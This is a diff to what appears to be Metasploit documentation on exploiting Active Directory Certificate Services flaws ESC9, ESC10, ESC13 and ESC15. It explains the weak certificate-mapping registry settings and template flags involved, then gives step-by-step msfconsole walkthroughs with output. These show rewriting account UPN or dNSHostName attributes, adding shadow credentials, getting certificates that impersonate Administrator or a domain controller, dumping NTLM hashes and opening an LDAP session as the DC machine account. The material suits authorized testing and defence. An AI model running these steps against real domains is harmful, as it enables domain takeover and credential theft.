+| 1       | Will use strong mapping if present though can be ignored if CT_FLAG_NO_SECURITY_EXTENSION is set | weak                |
+| 2       | Full Enforcement Mode (No weak mappings allowed)                                                 | strong              |
+
+In order to exploit these certificate misconfiguration we will need the value of  `StrongCertificateBindingEnforcement` to be either `0` or `1`.
+If the value is set to `2` we cannot exploit the misconfiguration using Kerberos authentication.
+
+## CertificateMappingMethods
+Located in: `HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel`
+
+This registry key defines what is considered weak and strong certificate mappings for **Schannel authentication**. Possible values:
+
+| Bit | Setting | Method                                | Strength assessment |
+| --- | ------- | ------------------------------------- | ------------------- |
+| 1   | 0x0001  | Subject/Issuer certificate mapping    | weak                |
+| 2   | 0x0002  | Issuer certificate mapping            | weak                |
+| 3   | 0x0004  | UPN certificate mapping               | weak                |
+| 4   | 0x0008  | S4U2Self certificate mapping          | strong              |
+| 5   | 0x0010  | S4U2Self explicit certificate mapping | strong              |
+| 1-5 | 0x001F  | All of the above values               | weak                |
+
+In order to exploit these certificate misconfiguration using Schannel authentication we will need the value of
+`CertificateMappingMethods` to be `UPN certificate mapping` (or `All the above values`)
+
+
+## CT_FLAG_NO_SECURITY_EXTENSION
+Certificate templates now include an attribute called `msPKI-Enrollment-Flag`. The `msPKI-Enrollment-Flag` attribute
+defines how certificate enrollment behaves by enabling or disabling specific behaviors via a bitmask of flags. If the
+attribute contains the value:`0x00080000` (aka `CT_FLAG_NO_SECURITY_EXTENSION`) then the `szOID_NTDS_CA_SECURITY_EXT`
+is not included and we can exploit weak certificate mappings even if `StrongCertificateBindingEnforcement` is set to 1.
+
+
+## Changing userPrincipalName vs dNSHostName
+Both can be used to exploit the certificate misconfiguration. It should be noted that normal users don't have a `dNSHostName`
+attribute, only machine accounts do.
+
+# Exploiting ESC9
+## ESC9 Scenario 1
+Pre-requisites:
+- `StrongCertificateBindingEnforcement` is set to `1` (if it's set to `0` exploitation will still work but technically you're exploiting ESC10 in that case)
+- A vulnerable certificate template has the `CT_FLAG_NO_SECURITY_EXTENSION` flag set. 
+- The same vulnerable template has the `SubjectAltRequireUPN` flag set.
+- The same vulnerable template has a client authentication EKU
+- We have credentials of a user who has `GenericWrite` privileges over another user that can enroll in the vulnerable template
+
+```
+msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > run
+...
+[+] Template: ESC9-Template
+[*]   Distinguished Name: CN=ESC9-Template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=kerberos,DC=issue
+[*]   Manager Approval: Disabled
+[*]   Required Signatures: 0
+[!]   Potentially vulnerable to: ESC9 (the template is in a vulnerable configuration but in order to exploit registry key StrongCertificateBindingEnforcement must not be set to 2)
+[*]   Notes:
+[*]     * ESC9: Template has msPKI-Enrollment-Flag set to 0x80000 (CT_FLAG_NO_SECURITY_EXTENSION) and specifies a client authentication EKU and user1 has write privileges over user2 and the template has a subjectAltName (UPN or DNS) requirement
+[*]  Certificate Template Write-Enabled SIDs:
+[*]     * S-1-5-21-2324486357-3075865580-3606784161-1602 (user1)
+[*]     * S-1-5-21-2324486357-3075865580-3606784161-1603 (user2)
+[*]     * S-1-5-11 (Authenticated Users)
+[*]   Certificate Template Enrollment SIDs:
+[*]     * S-1-5-21-2324486357-3075865580-3606784161-1602 (user1)
+[*]     * S-1-5-21-2324486357-3075865580-3606784161-1603 (user2)
+[*]     * S-1-5-11 (Authenticated Users)
+...
+```
+Now we can see the above template is possibly exploitable if the `StrongCertificateBindingEnforcement` is set to `1`. In 
+our case it is so we can proceed with exploitation. 
+
+We will set a number of datastore options in order to exploit ESC9 in this scenario.
+We will set `RHOSTS`, `CERT_TEMPLATE`, and `CA` as we normally would. In order to update the UPN of the
+target user we must connect to LDAP and so the datastore options `LDAPUsername`, `LDAPPassword`, and `LDAPDomain`
+are the credentials of the user who has `GenericWrite` privileges over the `TARGET_USERNAME`. Note `LDAPRport` must be
+set in order to connect however it defaults to 389.
+
+The option `UPDATE_LDAP_OBJECT` is an enum that can be set to either `userPrincipalName`  or `dNSHostName` and must be
+set in order to instruct the module to attempt to exploit ESC9 or ESC10. We will set `UPDATE_LDAP_OBJECT` to
+`userPrincipalName` in this case and so we then must set `UPDATE_LDAP_OBJECT_VALUE` to `Administrator`.
+
+It's important for this scenario, when updating the UPN to omit the domain suffix from the UPN to avoid conflicts with
+other UPNs in the domain, which by default all contain the suffix. The UPN processing order will still allow the DC to
+map the UPN Administrator in our writable account to the actual administrator, making its impersonation possible.
+
+It's also important to note that after issuing the certificate we must revert the `userPrincipalName` of the
+`TARGET_USERNAME` back to the original value before attempting to use the certificate or the certificate will not work. 
+This is done automatically by the module. 
+
+In the following example, the ESC9-Template template is vulnerable to ESC9 and will yield a ticket for Administrator once complete. 
+
+```
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set rhosts 172.16.199.200
+rhosts => 172.16.199.200
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldaprport 389
+ldaprport => 389
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set target_username user2
+target_username => user2
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldapdomain kerberos.issue
+ldapdomain => kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldappassword N0tpassword!
+ldappassword => N0tpassword!
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldapusername user1
+ldapusername => user1
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set cert_template ESC9-Template
+cert_template => SpencerTest
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ca kerberos-DC2-CA
+ca => kerberos-DC2-CA
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set UPDATE_LDAP_OBJECT_VALUE Administrator
+UPDATE_LDAP_OBJECT_VALUE => Administrator
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > run
+[*] Running module against 172.16.199.200
+[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Current value of user2's userPrincipalName: user2
+[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to Administrator...
+[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to Administrator
+[+] The operation completed successfully!
+[*] 172.16.199.200:445 - Adding shadow credentials for user2
+[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
+[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Discovering base DN automatically
+[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
+[*] Certificate stored at: /Users/jheysel/.msf4/loot/20250717140905_default_172.16.199.200_windows.ad.cs_563081.pfx
+[+] Successfully updated the msDS-KeyCredentialLink attribute; certificate with device ID 2ff08c15-0ab3-98ad-ee0b-3fd1fbcf3e9d
+[*] 172.16.199.200:445 - Loading admin/kerberos/get_ticket
+[*] 172.16.199.200:445 - Getting hash for user2
+[!] Warning: Provided principal and realm (user2@kerberos.issue) do not match entries in certificate:
+[+] 172.16.199.200:88 - Received a valid TGT-Response
+[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717140905_default_172.16.199.200_mit.kerberos.cca_263627.bin
+[*] 172.16.199.200:88 - Getting NTLM hash for user2@kerberos.issue
+[+] 172.16.199.200:88 - Received a valid TGS-Response
+[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717140905_default_172.16.199.200_mit.kerberos.cca_015140.bin
+[+] Found NTLM hash for user2: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
+[+] 172.16.199.200:445 - The requested certificate was issued.
+[*] 172.16.199.200:445 - Certificate Policies:
+[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
+[*] 172.16.199.200:445 - Certificate UPN: Administrator
+[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250717140907_default_172.16.199.200_windows.ad.cs_548728.pfx
+[*] 172.16.199.200:445 - reverting ldap object
+[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
+[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Discovering base DN automatically
+[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
+[*] No matching entries found - check device ID
+[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Current value of user2's userPrincipalName: Administrator
+[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to user2...
+[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to user2
+[+] The operation completed successfully!
+[*] Auxiliary module execution completed
+```
+We can then use the `kerberos/get_ticket` module to gain a Kerberos ticket granting ticket (TGT) as the `Administrator`
+domain administrator. See the [Getting A Kerberos Ticket](#getting-a-kerberos-ticket) section for more information.
+
+## ESC9 Scenario 2
+Pre-requisites:
+- `StrongCertificateBindingEnforcement` is set to `1` (if it's set to `0` exploitation will still work but technically you're exploiting ESC10 in that case)
+- A vulnerable certificate template has the `CT_FLAG_NO_SECURITY_EXTENSION` flag set.
+- The same vulnerable template has the `SubjectAltRequireDNS` flag set. <--- (Difference 1/2 between pre-requisites in scenario 1 and 2)
+- The same vulnerable template has a client authentication EKU
+- We have credentials of a machine account who has `GenericWrite` privileges over another **machine account** that can enroll in the vulnerable template <--- (Difference 2/2 between pre-requisites in scenario 1 and 2)
+  - Only machine accounts can have the `dNSHostName` attribute set, so our "target_user" needs to be machine account
+
+The option `UPDATE_LDAP_OBJECT` will now be set to `dNSHostName` and because only machine accounts have the `dNSHostName` attribute we will set our `TARGET_USER` to the machine account`Test2$`
+We will be changing the `dNSHostName` of the machine account `Test1$` to `DC2.kerberos.issue` (`DC2` is the hostname of the domain controller) in hopes to impersonate the Domain Controller machine account
+
+`CERT_TEMPLATE` will be set to `ESC9-Template-Dns` which is the same template as `ESC9-Template` but with the `SubjectAltRequireDNS` flag set instead of the `SubjectAltRequireUPN` flag.
+
+```
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set rhosts 172.16.199.200
+rhosts => 172.16.199.200
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldaprport 389
+ldaprport => 389
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set target_username "Test2$"
+target_username => Test2$
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set UPDATE_LDAP_OBJECT_VALUE dc2.kerberos.issue
+UPDATE_LDAP_OBJECT_VALUE => dc2.kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set UPDATE_LDAP_OBJECT dnsHostName
+UPDATE_LDAP_OBJECT => dNSHostName
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set CA kerberos-DC2-CA
+CA => kerberos-DC2-CA
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set CERT_TEMPLATE ESC9-Template-Dns
+CERT_TEMPLATE => ESC9-Template-Dns
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldapdomain kerberos.issue
+ldapdomain => kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldappassword N0tpassword!
+ldappassword => N0tpassword!
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldapusername Test1$
+ldapusername => Test1$
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > run
+[*] Reloading module...
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Running module against 172.16.199.200
+[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Current value of Test2$'s dNSHostName:
+[*] Attempting to update dNSHostName for CN=Test2,CN=Computers,DC=kerberos,DC=issue to dc2.kerberos.issue...
+[+] Successfully updated CN=Test2,CN=Computers,DC=kerberos,DC=issue's dNSHostName to dc2.kerberos.issue
+[+] The operation completed successfully!
+[*] 172.16.199.200:445 - Adding shadow credentials for Test2$
+[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
+[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Discovering base DN automatically
+[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
+[*] Certificate stored at: /Users/jheysel/.msf4/loot/20250717141705_default_172.16.199.200_windows.ad.cs_907188.pfx
+[+] Successfully updated the msDS-KeyCredentialLink attribute; certificate with device ID 517757a2-5174-5c43-6005-102c4429ff05
+[*] 172.16.199.200:445 - Loading admin/kerberos/get_ticket
+[*] 172.16.199.200:445 - Getting hash for user2
+[!] Warning: Provided principal and realm (Test2$@kerberos.issue) do not match entries in certificate:
+[+] 172.16.199.200:88 - Received a valid TGT-Response
+[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717141705_default_172.16.199.200_mit.kerberos.cca_132784.bin
+[*] 172.16.199.200:88 - Getting NTLM hash for Test2$@kerberos.issue
+[+] 172.16.199.200:88 - Received a valid TGS-Response
+[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717141705_default_172.16.199.200_mit.kerberos.cca_364943.bin
+[+] Found NTLM hash for Test2$: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
+[+] 172.16.199.200:445 - The requested certificate was issued.
+[*] 172.16.199.200:445 - Certificate Policies:
+[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
+[*] 172.16.199.200:445 - Certificate DNS: dc2.kerberos.issue
+[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250717141706_default_172.16.199.200_windows.ad.cs_369517.pfx
+[*] 172.16.199.200:445 - reverting ldap object
+[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
+[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Discovering base DN automatically
+[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
+[+] Deleted entry with device ID 517757a2-5174-5c43-6005-102c4429ff05
+[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Attempting to delete attribute dNSHostName from CN=Test2,CN=Computers,DC=kerberos,DC=issue...
+[+] Successfully deleted attribute dNSHostName from CN=Test2,CN=Computers,DC=kerberos,DC=issue
+[+] The operation completed successfully!
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhosts=172.16.199.200 cert_file=/Users/jheysel/.msf4/loot/20250717141706_default_172.16.199.200_windows.ad.cs_369517.pfx
+[*] Running module against 172.16.199.200
+[+] 172.16.199.200:88 - Received a valid TGT-Response
+[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717142328_default_172.16.199.200_mit.kerberos.cca_370847.bin
+[*] 172.16.199.200:88 - Getting NTLM hash for dc2$@kerberos.issue
+[+] 172.16.199.200:88 - Received a valid TGS-Response
+[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717142328_default_172.16.199.200_mit.kerberos.cca_596103.bin
+[+] Found NTLM hash for dc2$: aad3b435b51404eeaad3b435b51404ee:cceede79c156a295f45e7ad38ee2f884
+[*] Auxiliary module execution completed
+```
+
+# Exploiting ESC10
+## ESC10 Scenario 1
+Pre-requisites:
+- `StrongCertificateBindingEnforcement` is set to `0`
+- Because the above is set to `0` we don't need the `CT_FLAG_NO_SECURITY_EXTENSION` flag set on the vulnerable template
+- Other than the above, pre-requisites and exploitation are the exact same as ESC9 Scenario 1
+
+## ESC10 Scenario 2
+Pre-requisites: 
+- `CertificateMappingMethods` is set to `0x0004` (UPN certificate mapping) or `0x001F` (All of the above values)
+- The vulnerable template has the `SubjectAltRequireUPN` set
+- The same vulnerable template has a client authentication EKU
+- We have credentials of a machine account who has `GenericWrite` privileges over another machine account that can enroll in the vulnerable template
+
+In this scenario we can only compromise accounts that do not already have a populated `userPrincipalName` attribute, such as machine accounts and the default domain administrator.
+In addition, because this registry key only applies to SChannel authentication we are forced to authenticate to LDAPS once we get a certificate.
+
+```
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set rhosts 172.16.199.200
+rhosts => 172.16.199.200
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldaprport 389
+ldaprport => 389
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set target_username "user2"
+target_username => user2
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set UPDATE_LDAP_OBJECT_VALUE 'DC2$@kerberos.issue'
+UPDATE_LDAP_OBJECT_VALUE => DC2$@kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set UPDATE_LDAP_OBJECT userPrincipalName
+UPDATE_LDAP_OBJECT => userPrincipalName
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set CA kerberos-DC2-CA
+CA => kerberos-DC2-CA
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set CERT_TEMPLATE ESC10-Template
+CERT_TEMPLATE => ESC10-Template
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldapdomain kerberos.issue
+ldapdomain => kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldappassword N0tpassword!
+ldappassword => N0tpassword!
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldapusername user1
+ldapusername => user1
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > run
+[*] Running module against 172.16.199.200
+[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Current value of user2's userPrincipalName: user2
+[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to DC2$@kerberos.issue...
+[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to DC2$@kerberos.issue
+[+] The operation completed successfully!
+[*] 172.16.199.200:445 - Adding shadow credentials for user2
+[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
+[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Discovering base DN automatically
+[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
+[*] Certificate stored at: /Users/jheysel/.msf4/loot/20250717143323_default_172.16.199.200_windows.ad.cs_860225.pfx
+[+] Successfully updated the msDS-KeyCredentialLink attribute; certificate with device ID 825a1a2f-336f-e41c-24fb-703bb79f79f9
+[*] 172.16.199.200:445 - Loading admin/kerberos/get_ticket
+[*] 172.16.199.200:445 - Getting hash for user2
+[!] Warning: Provided principal and realm (user2@kerberos.issue) do not match entries in certificate:
+[+] 172.16.199.200:88 - Received a valid TGT-Response
+[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717143323_default_172.16.199.200_mit.kerberos.cca_872380.bin
+[*] 172.16.199.200:88 - Getting NTLM hash for user2@kerberos.issue
+[+] 172.16.199.200:88 - Received a valid TGS-Response
+[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717143323_default_172.16.199.200_mit.kerberos.cca_123025.bin
+[+] Found NTLM hash for user2: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
+[+] 172.16.199.200:445 - The requested certificate was issued.
+[*] 172.16.199.200:445 - Certificate Policies:
+[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
+[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.1 (Server Authentication)
+[*] 172.16.199.200:445 -   * 1.3.6.1.4.1.311.20.2.2 (Smart Card Logon)
+[*] 172.16.199.200:445 - Certificate UPN: DC2$@kerberos.issue
+[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250717143324_default_172.16.199.200_windows.ad.cs_752634.pfx
+[*] 172.16.199.200:445 - reverting ldap object
+[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
+[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Discovering base DN automatically
+[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
+[+] Deleted entry with device ID 825a1a2f-336f-e41c-24fb-703bb79f79f9
+[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Current value of user2's userPrincipalName: DC2$@kerberos.issue
+[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to user2...
+[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to user2
+[+] The operation completed successfully!
+[*] Auxiliary module execution completed
+
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > use ldap_login
+[*] Using auxiliary/scanner/ldap/ldap_login
+[*] The CreateSession option within this module can open an interactive session
+
+msf6 auxiliary(scanner/ldap/ldap_login) > run ssl=true rhosts=172.16.199.200 LDAP::Auth=schannel LDAP::CertFile=/Users/jheysel/.msf4/loot/20250717143324_default_172.16.199.200_windows.ad.cs_752634.pfx
+[+] Success: 'Cert File /Users/jheysel/.msf4/loot/20250717143324_default_172.16.199.200_windows.ad.cs_752634.pfx'
+[*] LDAP session 1 opened (172.16.199.1:58674 -> 172.16.199.200:389) at 2025-07-17 14:35:08 -0700
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Bruteforce completed, 1 credential was successful.
+[*] 1 LDAP session was opened successfully.
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ldap/ldap_login) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type  Information                     Connection
+  --  ----  ----  -----------                     ----------
+  1         ldap  LDAP DC2$ @ 172.16.199.200:389  172.16.199.1:58674 -> 172.16.199.200:389 (172.16.199.200)
+
+```
+
 # Exploiting ESC13
 To exploit ESC13, we need to target a certificate that has an issuance policy linked to a universal group in Active
 Directory. Unlike some of the other ESC techniques, successfully exploiting ESC13 isn't necessarily guaranteed to yield
@@ -931,7 +1327,7 @@ permissions will be included in the resulting Kerberos ticket in the notes secti
 ESC13-Test template is vulnerable to ESC13 and will yield a ticket including the ESC13-Group permissions.
 
 ```
-msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > run
+msf auxiliary(gather/ldap_esc_vulnerable_cert_finder) > run
 ...
 [+] Template: ESC13-Test
 [*]   Distinguished Name: CN=ESC13-Test,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=collalabs1,DC=local
@@ -954,20 +1350,20 @@ In this case, the ticket can be issued with the `icpr_cert` module. No additiona
 certificate beyond the standard `CA`, `CERT_TEMPLATE`, target and authentication options.
 
 ```
-msf6 > use auxiliary/admin/dcerpc/icpr_cert 
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
+msf > use auxiliary/admin/dcerpc/icpr_cert 
+msf auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
 SMBUser => normaluser
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain COLLALABS1
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain COLLALABS1
 SMBDomain => COLLALABS1
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
 SMBPass => normalpass
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA collalabs1-SRV-ADDS01-CA
+msf auxiliary(admin/dcerpc/icpr_cert) > set CA collalabs1-SRV-ADDS01-CA
 CA => collalabs1-SRV-ADDS01-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC13-Test
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC13-Test
 CERT_TEMPLATE => ESC13-Test
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [+] 172.30.239.85:445 - The requested certificate was issued.
@@ -976,7 +1372,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 172.30.239.85:445 - Certificate UPN: normaluser@collalabs1.local
 [*] 172.30.239.85:445 - Certificate stored at: /home/normaluser/.msf4/loot/20240226170310_default_172.30.239.85_windows.ad.cs_917878.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 We can then use the `kerberos/get_ticket` module to gain a Kerberos ticket granting ticket (TGT) with the `ESC13-Group`
@@ -993,25 +1389,25 @@ used for authentication to LDAP via SCHANNEL. The operator can then perform LDAP
 specified in the alternate UPN.
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
+msf auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
 SMBUser => normaluser
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain COLLALABS1
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain COLLALABS1
 SMBDomain => COLLALABS1
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
 SMBPass => normalpass
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA collalabs1-SRV-ADDS01-CA
+msf auxiliary(admin/dcerpc/icpr_cert) > set CA collalabs1-SRV-ADDS01-CA
 CA => collalabs1-SRV-ADDS01-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC15-Test
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC15-Test
 CERT_TEMPLATE => ESC15-Test
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ADD_CERT_APP_POLICY 1.3.6.1.5.5.7.3.2
+msf auxiliary(admin/dcerpc/icpr_cert) > set ADD_CERT_APP_POLICY 1.3.6.1.5.5.7.3.2
 ADD_CERT_APP_POLICY => 1.3.6.1.5.5.7.3.2
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_UPN administrator@collalabs1.local
+msf auxiliary(admin/dcerpc/icpr_cert) > set ALT_UPN administrator@collalabs1.local
 ALT_UPN => administrator@collalabs1.local
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_SID S-1-5-21-3402587289-1488798532-3618296993-1000
+msf auxiliary(admin/dcerpc/icpr_cert) > set ALT_SID S-1-5-21-3402587289-1488798532-3618296993-1000
 ALT_SID => S-1-5-21-3402587289-1488798532-3618296993-1000
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [*] 172.30.239.85:445 - Requesting a certificate...
@@ -1021,7 +1417,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 172.30.239.85:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
 [*] 172.30.239.85:445 - Certificate stored at: /home/normaluser/.msf4/loot/20241009171337_default_172.30.239.85_windows.ad.cs_089081.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 Certificates issued using this technique are not directly able to be used for Kerberos authentication via PKINIT.
@@ -1029,21 +1425,21 @@ However, the attack can be modified by adding the Certificate Request Agent OID 
 certificate that can issue additional certificates in a manner similar to ESC2 which are compatible with PKINIT.
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
+msf auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
 SMBUser => normaluser
